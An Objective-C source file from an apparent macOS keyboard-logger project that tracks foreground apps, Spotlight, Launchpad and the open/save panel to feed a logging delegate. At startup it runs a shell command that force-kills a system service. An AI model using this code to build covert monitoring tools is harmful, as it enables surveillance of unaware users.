//
//  ApplicationLifeCycleNotifier.m
//  KeyboardLoggerManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/30/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "ApplicationLifeCycleNotifier.h"
#import "ApplicationInfo.h"
#import "EmbeddedApplicationInfo.h"
#import "ApplicationLifeCycleDelegate.h"

#import <AppKit/AppKit.h>
#import <Carbon/Carbon.h>

@interface ApplicationLifeCycleNotifier (private)
- (void)appDidActivate:(NSNotification *)notification;
- (void)appDidDeactivate:(NSNotification *)notification;
- (void) notifySpotlight:(NSNotification *)notification;
- (void) registerSpotlightAXObserver;
- (void) unregisterSpotlightAXObserver;
- (void) registerEmbeddedALC;
- (void) unregisterEmbeddedALC;
- (void) detectSpotlightWindow: (NSThread *) aArgs;
- (void) detectSpotlightWindowV2: (NSThread *) aArgs;
- (void) startDetectLaunchpad;
- (void) stopDetectLaunchpad;
- (void) detectLaunchpadWindowDisappear: (NSArray *) aArgs;
- (void) launchpadWindowAppear;
- (void) launchpadWindowDisappear;
@end

@implementation ApplicationLifeCycleNotifier

@synthesize mApplicationLifeCycleDelegate, mLaunchpadDetectorThread, mSpotlightDetectorThread;

#pragma mark ############## Init

-(id)initWithALCDelegate:(id <ApplicationLifeCycleDelegate>) aApplicationLifeCycle{
    if ((self = [super init])) {
        [self setMApplicationLifeCycleDelegate:aApplicationLifeCycle];
	}
	return self;
}

#pragma mark ############## Start & Stop

-(void)startNotify{
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appDidActivate:)  name:NSWorkspaceDidActivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appDidDeactivate:)  name:NSWorkspaceDidDeactivateApplicationNotification  object:nil];

    [[NSDistributedNotificationCenter defaultCenter] addObserver:self selector:@selector(notifySpotlight:) name:@"com.apple.HIToolbox.beginMenuTrackingNotification" object:nil];
    [[NSDistributedNotificationCenter defaultCenter] addObserver:self selector:@selector(notifySpotlight:) name:@"com.apple.HIToolbox.endMenuTrackingNotification" object:nil];
    
    // For testing purposes
    //[[NSDistributedNotificationCenter defaultCenter] addObserver:self selector:@selector(notifySpotlight:) name:@"com.apple.launchpad.toggle" object:nil];
    //[[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(notifySpotlight:)  name:@"com.apple.launchpad.toggle"  object:nil];
    //[[NSNotificationCenter defaultCenter] addObserver:self  selector:@selector(notifySpotlight:)  name:nil  object:nil];
    
    // 10.10, 10.9
    [self registerSpotlightAXObserver];
    
    // 10.10, 10.9
    [self startDetectLaunchpad];
    
    // 10.10, 10.9
    [self registerEmbeddedALC];
    
}

-(void)stopNotify{
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidActivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    
    [[NSDistributedNotificationCenter defaultCenter]removeObserver:self name:@"com.apple.HIToolbox.beginMenuTrackingNotification" object:nil];
    [[NSDistributedNotificationCenter defaultCenter]removeObserver:self name:@"com.apple.HIToolbox.endMenuTrackingNotification" object:nil];
    
    // 10.10, 10.9
    [self unregisterSpotlightAXObserver];
    
    // 10.10, 10.9
    [self stopDetectLaunchpad];
    
    // 10.10, 10.9
    [self unregisterEmbeddedALC];
}

- (void)appDidActivate:(NSNotification *)notification {
    DLog(@"Application did activate, %@", notification);
    if ([mApplicationLifeCycleDelegate respondsToSelector:@selector(applicationDidEnterForeground:)]) {
        NSDictionary *userInfo = [notification userInfo];
        NSRunningApplication * app = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];

        ApplicationInfo * appInfo =[[ApplicationInfo alloc]init];
        [appInfo setMAppName:[app localizedName]];
        [appInfo setMAppBundle:[app bundleIdentifier]];
        [mApplicationLifeCycleDelegate applicationDidEnterForeground:appInfo];
        [appInfo release];
    }
}

- (void)appDidDeactivate:(NSNotification *)notification {
    
    if ([mApplicationLifeCycleDelegate respondsToSelector:@selector(applicationDidEnterBackground:)]) {
        NSDictionary *userInfo = [notification userInfo];
        NSRunningApplication * app = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];

        ApplicationInfo * appInfo =[[ApplicationInfo alloc]init];
        [appInfo setMAppName:[app localizedName]];
        [appInfo setMAppBundle:[app bundleIdentifier]];
        [mApplicationLifeCycleDelegate applicationDidEnterBackground:appInfo];
        [appInfo release];
    }
}

-(void) notifySpotlight:(NSNotification *)notification{
    DLog(@"Notification name: %@", [notification name]);
    if ([[notification name]isEqualToString:@"com.apple.HIToolbox.beginMenuTrackingNotification"]) {
        if ([mApplicationLifeCycleDelegate respondsToSelector:@selector(spotlightBeginTracking)]) {
            [mApplicationLifeCycleDelegate spotlightBeginTracking];
        }
    }else if ([[notification name]isEqualToString:@"com.apple.HIToolbox.endMenuTrackingNotification"]) {
        if ([mApplicationLifeCycleDelegate respondsToSelector:@selector(spotlightEndTracking)]) {
            [mApplicationLifeCycleDelegate spotlightEndTracking];
        }
    }
}

void spotlightAXObserverCallback(AXObserverRef observer, AXUIElementRef element, CFStringRef notificationName, void * contextData ){
    DLog(@"Sportlight AXObserver, notificationName = %@", notificationName);
    if ([(NSString *)notificationName isEqualToString:(NSString *)kAXMainWindowChangedNotification]) {
        ApplicationLifeCycleNotifier *mySelf = (ApplicationLifeCycleNotifier *)contextData;
        if ([mySelf.mApplicationLifeCycleDelegate respondsToSelector:@selector(spotlightBeginTracking)]) {
            [mySelf.mApplicationLifeCycleDelegate spotlightBeginTracking];
            
            [NSThread detachNewThreadSelector:@selector(detectSpotlightWindow:) toTarget:mySelf withObject:[NSThread currentThread]];
        }
    }
}

static OSStatus CarbonEventHandler(
                                   EventHandlerCallRef inHandlerCallRef,
                                   EventRef            inEvent,
                                   void *              inUserData
                                   )
{
    ProcessSerialNumber psn = {0, 0};
    
    ApplicationLifeCycleNotifier *mySelf = (ApplicationLifeCycleNotifier *)inUserData;
    
    (void) GetEventParameter(
                             inEvent,
                             kEventParamProcessID,
                             typeProcessSerialNumber,
                             NULL,
                             sizeof(psn),
                             NULL,
                             &psn
                             );
    
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    CFStringRef processName = nil;
    if (CopyProcessName(&psn, &processName) == noErr) {
        int event = GetEventKind(inEvent);
        DLog(@"event = %d, processName = %@", event, processName);
        if ([(NSString *)processName isEqualToString:@"com.apple.appkit.xpc.openAndSavePanelService"]) {
            pid_t pid = 0;
            GetProcessPID(&psn, &pid);
#pragma GCC diagnostic pop
            
            NSRunningApplication *frontmostApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
            pid_t remotePID = [frontmostApp processIdentifier];
            
            EmbeddedApplicationInfo *embeddedAppInfo = [[[EmbeddedApplicationInfo alloc] init] autorelease];
            [embeddedAppInfo setMAppName:(NSString *)processName];
            [embeddedAppInfo setMPID:pid];
            [embeddedAppInfo setMPSN:psn];
            [embeddedAppInfo setMRemotePID:remotePID];
            
            if (event == kEventAppLaunched) {
                [mySelf.mApplicationLifeCycleDelegate embeddedApplicationLaunched:embeddedAppInfo];
            } else if (event == kEventAppTerminated) {
                [mySelf.mApplicationLifeCycleDelegate embeddedApplicationTerminated:embeddedAppInfo];
            }
        } else if ([(NSString *)processName isEqualToString:@"Dock"] ||
                   [(NSString *)processName isEqualToString:@"SystemUIServer"]) {
            if (event == kEventAppLaunched) {
                // Dock application relaunch
                DLog(@"Dock or SystemUIServer relaunchs for some reasons");
                [mySelf stopNotify];
                [mySelf startNotify];
            }
        }
    }
    if (processName) CFRelease(processName);
    
    return noErr;
}

#pragma mark - Spotlight -
- (void) registerSpotlightAXObserver {
    pid_t pid = 0;
    NSArray *runningApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:@"com.apple.Spotlight"];
    NSRunningApplication *spotlightApp = [runningApps firstObject];
    pid = [spotlightApp processIdentifier];
    DLog(@"PID of Spotlight = %d", pid);
    
    if (pid != 0) {
        // 10.10
        AXUIElementRef process = AXUIElementCreateApplication(pid);
        AXError err = AXObserverCreate(pid, spotlightAXObserverCallback, &mObserver1);
        if ( err != kAXErrorSuccess ){DLog(@"Error kAXMainWindowChangedNotification");}
        AXObserverAddNotification(mObserver1, (AXUIElementRef)process,kAXMainWindowChangedNotification, self);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), AXObserverGetRunLoopSource(mObserver1), kCFRunLoopDefaultMode);
        if (process) CFRelease(process);
    } else {
        // 10.9
        [NSThread detachNewThreadSelector:@selector(detectSpotlightWindowV2:) toTarget:self withObject:[NSThread currentThread]];
    }
}

- (void) unregisterSpotlightAXObserver {
    pid_t pid = 0;
    NSArray *runningApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:@"com.apple.Spotlight"];
    NSRunningApplication *spotlightApp = [runningApps firstObject];
    pid = [spotlightApp processIdentifier];
    DLog(@"PID of Spotlight = %d", pid);
    
    if (pid != 0) {
        // 10.10
        if (mObserver1 != nil) {
            AXUIElementRef process = AXUIElementCreateApplication(pid);
            CFRunLoopRemoveSource(CFRunLoopGetCurrent(), AXObserverGetRunLoopSource(mObserver1), kCFRunLoopDefaultMode);
            AXObserverRemoveNotification(mObserver1, process,kAXMainWindowChangedNotification);
            if (process) CFRelease(process);
            CFRelease(mObserver1);
            mObserver1 = nil;
        }
    } else {
        // 10.9
        [self.mSpotlightDetectorThread cancel];
        self.mSpotlightDetectorThread = nil;
    }
}

#pragma mark - Open, Save panel service -
- (void) registerEmbeddedALC {
    system("killall -9 com.apple.appkit.xpc.openAndSavePanelService");
    
    /*
     kEventClassApplication quick reference:
     
     kEventAppActivated                      = 1,
     kEventAppDeactivated                    = 2,
     kEventAppQuit                           = 3,
     kEventAppLaunchNotification             = 4,
     kEventAppLaunched                       = 5,
     kEventAppTerminated                     = 6,
     kEventAppFrontSwitched                  = 7,
     
     kEventAppFocusMenuBar                   = 8,
     kEventAppFocusNextDocumentWindow        = 9,
     kEventAppFocusNextFloatingWindow        = 10,
     kEventAppFocusToolbar                   = 11,
     kEventAppFocusDrawer                    = 12,
     
     kEventAppGetDockTileMenu                = 20,
     kEventAppUpdateDockTile                 = 21,
     
     kEventAppIsEventInInstantMouser         = 104,
     
     kEventAppHidden                         = 107,
     kEventAppShown                          = 108,
     kEventAppSystemUIModeChanged            = 109,
     kEventAppAvailableWindowBoundsChanged   = 110,
     kEventAppActiveWindowChanged            = 111
     */
    
    EventHandlerRef sCarbonEventsRef = mCarbonEventsRef;
    EventTypeSpec kEvents[] = {
        { kEventClassApplication, kEventAppLaunched },
        { kEventClassApplication, kEventAppTerminated },
        { kEventClassApplication, kEventAppQuit }
    };
    
    if (sCarbonEventsRef == NULL) {
        (void) InstallEventHandler(
                                   GetApplicationEventTarget(),
                                   (EventHandlerUPP) CarbonEventHandler,
                                   GetEventTypeCount(kEvents),
                                   kEvents,
                                   self,
                                   &sCarbonEventsRef
                                   );
        mCarbonEventsRef = sCarbonEventsRef;
    }
    
    // Execution continues in CarbonEventHandler, below.
}

- (void) unregisterEmbeddedALC {
    if (mCarbonEventsRef) {
        RemoveEventHandler(mCarbonEventsRef);
        mCarbonEventsRef = NULL;
    }
}

#pragma mark - Spotlight detection -
- (void) detectSpotlightWindow: (NSThread *) aArgs {
    NSAutoreleasePool *pool1 = [[NSAutoreleasePool alloc] init];
    // Make sure Spotlight searching screen is fully drawn
    [NSThread sleepForTimeInterval:1.0];
    
    BOOL spotlightWindowShown = YES;
    
    pid_t pid = 0;
    NSArray *runningApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:@"com.apple.Spotlight"];
    NSRunningApplication *spotlightApp = [runningApps firstObject];
    pid = [spotlightApp processIdentifier];
    DLog(@"PID of Spotlight = %d", pid);
    
    while (spotlightWindowShown && pid != 0) {
        NSAutoreleasePool *pool2 = [[NSAutoreleasePool alloc] init];
        spotlightWindowShown = NO;
        
        CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
        CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
        for (int i = (int)[(NSArray *)windowList count] - 1; i >= 0; i--) {
            NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
            NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
            if (pid == [windowPID intValue]) {
                //DLog(@"Spotlight, windowDict(%d) = %@", i, windowDict);
                NSNumber *windowStoreType = [windowDict objectForKey:(NSString *)kCGWindowStoreType];
                if ([windowStoreType intValue] == kCGBackingStoreNonretained) {
                    spotlightWindowShown = YES;
                    break;
                }
            }
        }
        
        CFBridgingRelease(windowList);
        
        [pool2 release];
        
        [NSThread sleepForTimeInterval:0.2];
    }
    
    // Post notification: com.apple.HIToolbox.endMenuTrackingNotification
    NSNotification *endMenuTrackingNotification = [NSNotification notificationWithName:@"com.apple.HIToolbox.endMenuTrackingNotification" object:self];
    [self performSelector:@selector(notifySpotlight:) onThread:aArgs withObject:endMenuTrackingNotification waitUntilDone:NO];
    
    DLog(@"HI... I no longer detect Spotlight 10.10 onward");
    [pool1 release];
}

- (void) detectSpotlightWindowV2: (NSThread *) aArgs {
    NSAutoreleasePool *pool1 = [[NSAutoreleasePool alloc] init];
    NSThread *myThread = [NSThread currentThread];
    self.mSpotlightDetectorThread = myThread;
    
    BOOL spotlightWindowShowing = NO;
    
    pid_t pid = 0;
    NSArray *runningApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:@"com.apple.systemuiserver"];
    NSRunningApplication *spotlightApp = [runningApps firstObject];
    pid = [spotlightApp processIdentifier];
    DLog(@"PID of SystemUIServer = %d", pid);
    
    NSAutoreleasePool *pool2 = [[NSAutoreleasePool alloc] init];
    
    // Initialization of spotlightWindowShowing flag
    CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
    CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
    for (int i = (int)[(NSArray *)windowList count] - 1; i >= 0; i--) {
        NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
        NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
        if (pid == [windowPID intValue]) {
            //DLog(@"Spotlight, windowDict(%d) = %@", i, windowDict);
            NSNumber *windowLayer = [windowDict objectForKey:(NSString *)kCGWindowLayer];
            if ([windowLayer intValue] == 23) { // SonOfGrab to see this magic number
                spotlightWindowShowing = YES;
                break;
            }
        }
    }
    CFBridgingRelease(windowList);
    windowList = nil;
    
    [pool2 release];
    
    while (![myThread isCancelled] && pid != 0) {
        NSAutoreleasePool *pool3 = [[NSAutoreleasePool alloc] init];
        BOOL shown = NO;
        
        CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
        CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
        for (int i = (int)[(NSArray *)windowList count] - 1; i >= 0; i--) {
            NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
            NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
            if (pid == [windowPID intValue]) {
                //DLog(@"Spotlight, windowDict(%d) = %@", i, windowDict);
                NSNumber *windowLayer = [windowDict objectForKey:(NSString *)kCGWindowLayer];
                if ([windowLayer intValue] == 23) { // SonOfGrab to see this magic number
                    shown = YES;
                    break;
                }
            }
        }
        
        CFBridgingRelease(windowList);
        windowList = nil;
        
        if (shown) {
            if (!spotlightWindowShowing) {
                DLog(@"Disappear to Appear");
                spotlightWindowShowing = YES;
                
                // Post notification: com.apple.HIToolbox.beginMenuTrackingNotification
                NSNotification *beginMenuTrackingNotification = [NSNotification notificationWithName:@"com.apple.HIToolbox.beginMenuTrackingNotification" object:self];
                [self performSelector:@selector(notifySpotlight:) onThread:aArgs withObject:beginMenuTrackingNotification waitUntilDone:NO];
            }
        } else {
            if (spotlightWindowShowing) {
                DLog(@"Appear to Disappear");
                spotlightWindowShowing = NO;
                
                // Post notification: com.apple.HIToolbox.endMenuTrackingNotification
                NSNotification *endMenuTrackingNotification = [NSNotification notificationWithName:@"com.apple.HIToolbox.endMenuTrackingNotification" object:self];
                [self performSelector:@selector(notifySpotlight:) onThread:aArgs withObject:endMenuTrackingNotification waitUntilDone:NO];
            }
        }
        
        [pool3 release];
        
        [NSThread sleepForTimeInterval:0.2];
    }
    
    DLog(@"HI... I no longer detect Spotlight 10.9");
    [pool1 release];
}

#pragma mark - Launchpad -
- (void) startDetectLaunchpad {
    NSArray *args = [NSArray arrayWithObjects:[NSThread currentThread], nil];
    [NSThread detachNewThreadSelector:@selector(detectLaunchpadWindowDisappear:) toTarget:self withObject:args];
}

- (void) stopDetectLaunchpad {
    [self.mLaunchpadDetectorThread cancel];
    self.mLaunchpadDetectorThread = nil;
}

- (void) detectLaunchpadWindowDisappear: (NSArray *) aArgs {
    NSAutoreleasePool *pool1 = [[NSAutoreleasePool alloc] init];
    NSThread *theThread = [aArgs objectAtIndex:0];
    
    NSThread *myThread = [NSThread currentThread];
    self.mLaunchpadDetectorThread = myThread;
    
    BOOL launchpadWindowShowing = NO;
    
    pid_t pid = 0;
    NSArray *runningApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:@"com.apple.dock"];
    NSRunningApplication *launchpadApp = [runningApps firstObject];
    pid = [launchpadApp processIdentifier];
    DLog(@"PID of launchpadApp = %d", pid);
    
    NSAutoreleasePool *pool2 = [[NSAutoreleasePool alloc] init];
    
    // Initialize launchpadWindowShowing variable
    CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
    CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
    NSDictionary * windowDict  = [(NSArray *)windowList firstObject];
    NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
    if (pid == [windowPID intValue]) {
        DLog(@"Launchpad initialize flag, windowDict(firstObject) = %@", windowDict);
        NSNumber *windowLayer = [windowDict objectForKey:(NSString *)kCGWindowLayer];
        if ([windowLayer intValue] == 27) { // SonOfGrab to see this magic number
            launchpadWindowShowing = YES;
        }
    }
    CFBridgingRelease(windowList);
    windowList = nil;
    
    [pool2 release];
    
    while ( ![myThread isCancelled] && pid != 0) {
        NSAutoreleasePool *pool3 = [[NSAutoreleasePool alloc] init];
        BOOL shown = NO;
        
        CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
        CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
        for (int i = 0; i < (int)[(NSArray *)windowList count]; i++) {
            NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
            NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
            if (pid == [windowPID intValue]) {
                //DLog(@"Launchpad, windowDict(%d) = %@", i, windowDict);
                NSNumber *windowLayer = [windowDict objectForKey:(NSString *)kCGWindowLayer];
                if ([windowLayer intValue] == 27) { // SonOfGrab to see this magic number
                    shown = YES;
                }
            }
        }
        CFBridgingRelease(windowList);
        windowList = nil;
        
        if (shown) {
            if (!launchpadWindowShowing) {
                DLog(@"Disappear to Appear");
                launchpadWindowShowing = YES;
                [self performSelector:@selector(launchpadWindowAppear) onThread:theThread withObject:nil waitUntilDone:NO];
            }
        } else {
            if (launchpadWindowShowing) {
                DLog(@"Appear to Disappear");
                launchpadWindowShowing = NO;
                [self performSelector:@selector(launchpadWindowDisappear) onThread:theThread withObject:nil waitUntilDone:NO];
            }
        }
        
        [pool3 release];
        
        [NSThread sleepForTimeInterval:0.2];
    }
    
    DLog(@"HI... I no longer detect Launchpad");
    [pool1 release];
}

- (void) launchpadWindowDisappear {
    if ([self.mApplicationLifeCycleDelegate respondsToSelector:@selector(launchpadDidDisappear)]) {
        [self.mApplicationLifeCycleDelegate performSelector:@selector(launchpadDidDisappear)];
    }
}

- (void) launchpadWindowAppear {
    if ([self.mApplicationLifeCycleDelegate respondsToSelector:@selector(launchpadDidAppear)]) {
        [self.mApplicationLifeCycleDelegate performSelector:@selector(launchpadDidAppear)];
    }
}

- (void)dealloc{
    [self stopNotify];
    [super dealloc];
}

@end
